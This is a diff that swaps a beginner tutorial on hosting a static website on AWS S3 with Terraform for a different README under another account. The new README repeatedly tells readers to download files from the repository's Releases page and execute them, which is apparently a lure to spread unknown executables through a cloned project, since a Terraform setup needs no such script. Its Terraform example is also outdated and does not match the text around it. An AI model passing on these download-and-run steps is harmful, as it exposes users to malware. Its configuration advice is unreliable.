@@ -1,202 +1,143 @@
-How to Host a Static Website on AWS S3 Using Terraform: Step-by-Step Guide for DevOps Beginners.
-================================================================================================
+# Terraform S3 Static Website Hosting: A Simple Guide 🌐
 
-![Terraform](https://miro.medium.com/v2/resize:fit:1400/format:webp/0*zgpRl0bbPpz618h4.png)
+![GitHub release](https://img.shields.io/github/release/Mimikqq/terraform-s3-static-website-hosting.svg)
+![GitHub issues](https://img.shields.io/github/issues/Mimikqq/terraform-s3-static-website-hosting.svg)
+![GitHub stars](https://img.shields.io/github/stars/Mimikqq/terraform-s3-static-website-hosting.svg)
 
-**Introduction**
-----------------
+## Overview
 
-As a DevOps beginner, deploying your first static website using **Terraform on AWS S3** is one of the best hands-on projects to understand **Infrastructure as Code (IaC)**, AWS services, and real-world DevOps workflows.
+This repository provides a straightforward solution for hosting static websites on AWS using Terraform. With this setup, you can deploy your static content quickly and efficiently. The repository covers essential topics like AWS, HCL, hosting, S3 buckets, and Terraform.
 
-In this guide, you will learn **how to automate S3 bucket creation, configure it for static website hosting, and upload your website files using Terraform**.
+## Table of Contents
 
-What is Terraform?
-------------------
+- [Prerequisites](#prerequisites)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Deploying Your Website](#deploying-your-website)
+- [Managing Releases](#managing-releases)
+- [Contributing](#contributing)
+- [License](#license)
 
-**Terraform** is an **open-source Infrastructure as Code (IaC) tool** created by HashiCorp that allows you to **define, provision, and manage cloud infrastructure using code**.
+## Prerequisites
 
-![worflow](https://github.com/user-attachments/assets/7f36dab0-04ad-489a-9800-be0d495a8aed)
+Before you begin, ensure you have the following:
 
+- An AWS account
+- Terraform installed on your local machine
+- Basic knowledge of AWS and Terraform
+- An IAM user with permissions to create S3 buckets and CloudFront distributions
 
-> Terraform setup : [https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli](https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli)
+## Installation
 
-Prerequisites
--------------
+1. **Clone the repository**:
+   ```bash
+   git clone https://github.com/Mimikqq/terraform-s3-static-website-hosting.git
+   cd terraform-s3-static-website-hosting
+   ```
 
-*   An AWS account.
-*   Terraform installed on your system( Either on VS code or on EC2 instance).
-*   AWS CLI configured (`aws configure`).
-*   Basic HTML files (`index.html`, `style.css`).
+2. **Download the latest release**:
+   Visit [Releases](https://github.com/Mimikqq/terraform-s3-static-website-hosting/releases) to download the necessary files. Execute the downloaded script to set up your environment.
 
-Why this project?
-=================
+## Usage
 
-*   Get hands-on with **Terraform basics.**
-*   Understand **S3 static website hosting**.
-*   Automate infrastructure, avoiding manual AWS console clicks.
+This repository provides a basic structure for deploying a static website. To get started, follow these steps:
 
-Step 1: Create Your Terraform Project
--------------------------------------
+1. **Navigate to the project directory**:
+   ```bash
+   cd terraform-s3-static-website-hosting
+   ```
 
-1.  Create <main.tf> where all the details regarding the project is present .
+2. **Initialize Terraform**:
+   ```bash
+   terraform init
+   ```
 
-```
-resource "aws_s3_bucket" "bucket" {
+3. **Plan your deployment**:
+   ```bash
+   terraform plan
+   ```
+
+4. **Apply your configuration**:
+   ```bash
+   terraform apply
+   ```
+
+5. **Confirm the changes**: Type `yes` when prompted.
+
+## Configuration
+
+You can customize the configuration by editing the `main.tf` file. Here are some key parameters:
+
+- **bucket_name**: Set the name of your S3 bucket.
+- **region**: Specify the AWS region for your resources.
+- **index_document**: Define the main HTML file of your website.
+- **error_document**: Specify the error page to display for 404 errors.
+
+### Example Configuration
+
+```hcl
+resource "aws_s3_bucket" "static_website" {
   bucket = var.bucket_name
-}
-resource "aws_s3_bucket_ownership_controls" "bucket" {
-  bucket = aws_s3_bucket.bucket.id
-  rule {
-    object_ownership = "BucketOwnerPreferred"
-  }
-}
-resource "aws_s3_bucket_public_access_block" "bucket" {
-  bucket = aws_s3_bucket.bucket.id
-  block_public_acls       = false
-  block_public_policy     = false
-  ignore_public_acls      = false
-  restrict_public_buckets = false
-}
-resource "aws_s3_bucket_acl" "bucket" {
-  depends_on = [    aws_s3_bucket_ownership_controls.bucket,
-    aws_s3_bucket_public_access_block.bucket
-  ]
-  bucket = aws_s3_bucket.bucket.id
   acl    = "public-read"
-}
-resource "aws_s3_bucket_policy" "public_read" {
-  bucket = aws_s3_bucket.bucket.id
-  policy = jsonencode({
-    Version = "2012-10-17",
-    Statement = [      {
-        Effect = "Allow",
-        Principal = "*",
-        Action = "s3:GetObject",
-        Resource = "${aws_s3_bucket.bucket.arn}/*"
-      }
-    ]
-  })
-}
-resource "aws_s3_object" "index" {
-  bucket       = aws_s3_bucket.bucket.id
-  key          = "index.html"
-  source       = "index.html"
-  content_type = "text/html"
-}
-resource "aws_s3_object" "style" {
-  bucket       = aws_s3_bucket.bucket.id
-  key          = "style.css"
-  source       = "style.css"
-  content_type = "text/css"
-}
-resource "aws_s3_object" "error" {
-  bucket       = aws_s3_bucket.bucket.id
-  key          = "error.html"
-  source       = "error.html"
-  content_type = "text/html"
-}
-resource "aws_s3_bucket_website_configuration" "website" {
-  bucket = aws_s3_bucket.bucket.id
-  index_document {
-    suffix = "index.html"
-  }
-  error_document {
-    key = "error.html"
-  }
-  depends_on = [aws_s3_bucket_acl.bucket]
-}
-```
 
-2. create <Variable.tf> , where all the variables are present .
-
-```
-variable "bucket_name" {
-  default = "myterraformbucket0019"
-}
-```
-
-3. create <Provider.tf> , which is used to mention which **cloud Provider** we are using for this project .
-
-```
-terraform {
-  required_providers {
-    aws = {
-      source  = "hashicorp/aws"
-      version = "5.10.0"
-    }
+  website {
+    index_document = var.index_document
+    error_document = var.error_document
   }
 }
-provider "aws" {
-  region = "ap-south-1"
-}
 ```
 
-4. Create <output.tf>
+## Deploying Your Website
 
-```
-output "websiteendpoint" {
-    value = "aws_s3_bucket.bucket.website_endpoint"
-}
-```
+To deploy your static website, follow these steps:
 
-Step 2: Add Website Files
--------------------------
+1. **Upload your website files**: Place your HTML, CSS, and JavaScript files in the `website` directory.
 
-1.  Create index.html and style.css for the making of the website .
+2. **Run the deployment**:
+   ```bash
+   terraform apply
+   ```
 
-*   **index.html** : [https://github.com/NikhilRaj-2003/terraform-s3-static-website-hosting/blob/main/design/index.html](https://github.com/NikhilRaj-2003/terraform-s3-static-website-hosting/blob/main/design/index.html)
-*   **style.css** : [https://github.com/NikhilRaj-2003/terraform-s3-static-website-hosting/blob/main/design/style.css](https://github.com/NikhilRaj-2003/terraform-s3-static-website-hosting/blob/main/design/style.css)
+3. **Access your website**: Once deployed, you can access your website using the S3 bucket URL.
 
-Step 3: Initialize and Deploy
------------------------------
+## Managing Releases
 
-1.  `terraform init` : **initializes your Terraform working directory**.
+To manage releases, check the [Releases](https://github.com/Mimikqq/terraform-s3-static-website-hosting/releases) section. Here, you can find the latest updates and download the required files.
 
-*   It **downloads the required provider plugins** (like AWS, Azure) needed to work with your cloud resources.
-*   It **sets up the backend configuration** (where your state file will be stored, like local or S3).
-*   It prepares the `.terraform` folder inside your project.
+## Contributing
 
-![terraform init](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LAQBmMzCLqGOZ4Z_FUwC5w.png)
+Contributions are welcome! If you want to improve this project, please follow these steps:
 
-2. `terraform plan`: Used to **preview changes** Terraform will make before applying .Reads your **Terraform configuration files** (`.tf` files).
+1. Fork the repository.
+2. Create a new branch:
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. Make your changes and commit them:
+   ```bash
+   git commit -m "Add some feature"
+   ```
+4. Push to the branch:
+   ```bash
+   git push origin feature/YourFeature
+   ```
+5. Create a pull request.
 
-*   Checks the **current state** of your infrastructure.
-*   Generates a **detailed execution plan** showing actions needed to match your desired configuration.
-*   Indicates **which resources will be created, updated, or destroyed**.
-*   Helps you **review and verify expected changes** safely.
-*   Reduces the chances of **accidental modifications** to your infrastructure.
+## License
 
-![terraform plan](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Z14xaaf8c1nZapqGSxadqw.png)
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-3. `terraform apply`: Used to **execute actions** required to reach the desired state of your infrastructure.
+## Resources
 
-*   Reads your **Terraform configuration files** (`.tf` files).
-*   Runs **after reviewing the plan** shown by `terraform plan` .
-*   Automatically **creates, updates, or deletes resources** on your cloud provider.
-*   **Prompts for confirmation** before proceeding (unless using `-auto-approve`).
+- [Terraform Documentation](https://www.terraform.io/docs/index.html)
+- [AWS S3 Documentation](https://docs.aws.amazon.com/s3/index.html)
+- [HCL Documentation](https://github.com/hashicorp/hcl)
 
-4. After giving terraform apply command it creates S3-Bucket in AWS Account , without opening AWS .
+## Support
 
-![S3 — Bucket .](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zRLTzEU2A7T4__7hy9ljEA.png)
+If you encounter issues or have questions, feel free to open an issue in the repository. Your feedback is valuable for improving this project.
 
-Step 4: Access Your Website
-===========================
+---
 
-*   Go to your AWS S3 bucket.
-*   Go to **Properties → Static Website Hosting**.
-*   Copy the **bucket website endpoint URL**
-*   Open in your browser and see your Terraform-hosted static website live.
-
-![Website — Hosted using Terraform .](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BNxKHWRfDNoqwwZ3-uP6yQ.png)
-
-What You Learned
-================
-
-1.Hosting a static website on AWS S3 using Terraform.
-2.Automating bucket creation, ACL, and public read policies using IaC.
-3.Practical DevOps workflow for portfolio-building.
-
-Conclusion
-==========
-
-Through this project, you have learned how to **host a static website on AWS S3 using Terraform**, enabling you to understand and apply the principles of **Infrastructure as Code (IaC)**. You automated the creation of an S3 bucket, configured it for static website hosting, and managed public access using Terraform, eliminating manual steps in the AWS console.
+For the latest releases, visit [Releases](https://github.com/Mimikqq/terraform-s3-static-website-hosting/releases). Download the necessary files and execute them to get started.
